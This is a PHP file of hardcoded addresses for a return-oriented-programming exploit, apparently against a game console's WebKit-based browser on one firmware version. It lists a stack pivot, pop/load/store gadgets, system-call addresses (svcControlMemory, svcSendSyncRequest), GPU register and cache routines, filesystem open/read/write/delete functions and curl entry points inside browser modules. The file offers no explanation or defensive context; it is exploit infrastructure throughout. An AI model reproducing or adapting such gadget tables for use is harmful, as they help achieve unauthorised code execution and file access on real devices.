<?php
$CODEBLK_ENDADR = ((0x00100000 + 0x00277000 + 0x00065000 + 0x0000A000 + 0x00045920) + 0xfff) & ~0xfff;
$OSSCRO_HEAPADR = 0x08133000;
$WEBKITCRO_HEAPADR = 0x083ff000;
$PEERCRO_HEAPADR = 0x0831a000;
$APPHEAP_PHYSADDR = 0x2b000000;
init_mapaddrs_cro();

$STACKPIVOT_ADR = 0x0027b568;
$COND_THROWFATALERR = 0x00262b9c;

$ROP_POP_R0R6PC = 0x001df7a4;
$ROP_POP_R0R8PC = 0x0030c970;
$ROP_POP_R0PC = 0x00297294;
$ROP_POP_R1R5PC = 0x001dcd84;

$ROP_STR_R1TOR0 = 0x0022673c;
$ROP_LDR_R0FROMR0 = 0x001f7858;
$ROP_ADDR0_TO_R1 = 0x0027be18;

$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x00297938;

$srv_GetServiceHandle = 0x001eaab0;

$svcGetProcessId = 0x0026c05c;
$svcSendSyncRequest = 0x001eb0ec;
$svcControlMemory = 0x0026390c;
$svcSleepThread = 0x002d9104;

$GXLOW_CMD4 = 0x002a28c8;
$GSPGPU_SERVHANDLEADR = 0x003e43d0;

$FS_MOUNTSDMC = 0x00319378;

$IFile_Open = 0x0032292c;
$IFile_GetSize = 0x001f1e30;
$IFile_Seek = 0x0032df94;
$IFile_Read = 0x0030ca94;

$FS_DELETEFILE = 0x0032615c;

$FSFILEIPC_CLOSE = 0x002681b8;
$FSFILEIPC_READ = 0x00268160;
$FSFILEIPC_GETSIZE = 0x00334f80;

$POPPC = 0x001df5c0;

$ROP_STR_R0TOR1 = $WEBKITCRO_MAPADR+0x004223dc;

$WKC_FOPEN = $OSSCRO_MAPADR+0xde3a8-0x4;
$WKC_FCLOSE = $OSSCRO_MAPADR+0xde398-0x4;
$WKC_FREAD = $OSSCRO_MAPADR+0xde3a0-0x4;
$WKC_FWRITE = $OSSCRO_MAPADR+0xde3b0-0x4;
$WKC_FSEEK = $PEERCRO_MAPADR+0x1f83d;

$ROP_curl_easy_cleanup = $WEBKITCRO_MAPADR+0x4dbaf0-0x4;
$ROP_curl_easy_init = $WEBKITCRO_MAPADR+0x4db658-0x4;
$ROP_curl_easy_perform = $WEBKITCRO_MAPADR+0x4dbbb8-0x4;
$ROP_curl_easy_setopt = $WEBKITCRO_MAPADR+0x4db660-0x4;

$ROP_MEMCPY = $WEBKITCRO_MAPADR+0x4daf00-0x4;
$ROP_MEMSETOTHER = $WEBKITCRO_MAPADR+0x4daee0-0x4;

$ROP_snprintf = $OSSCRO_MAPADR+0xde1a0-0x4;

$GSP_FLUSHDCACHE = 0x0029df0c;
$GSP_WRITEHWREGS = 0x00298734;

$IFile_Close = 0x001ec5d4;
$IFile_Write = 0x003278a0;

$THROW_FATALERR = 0x001f1e00;

$ROP_LDMSTM_R5R4_R0R3 = 0x001e8adc;

$ROP_POP_R0IPPC = $WEBKITCRO_MAPADR+0x001b2e74;

$ROP_LDR_R0_FROMR0_SHIFTR1 = $OSSCRO_MAPADR+0x001027ac;

$ROP_STMR0_R0PC = $PEERCRO_MAPADR+0x0001ef51;
?>
